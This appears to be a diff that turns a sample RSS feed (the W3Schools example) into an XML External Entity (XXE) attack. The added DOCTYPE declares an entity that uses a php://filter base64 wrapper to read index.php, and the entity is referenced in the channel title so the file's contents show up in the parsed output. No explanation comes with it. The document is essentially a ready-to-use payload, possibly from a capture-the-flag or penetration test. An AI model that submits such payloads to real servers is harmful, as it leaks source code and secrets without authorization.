@@ -1,8 +1,9 @@
 <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <rss version="2.0">
 
 <channel>
-  <title>W3Schools Home Page</title>
+  <title>W3Schools Home Page &xxe</title>
   <link>https://www.w3schools.com</link>
   <description>Free web building tutorials</description>
   <item>
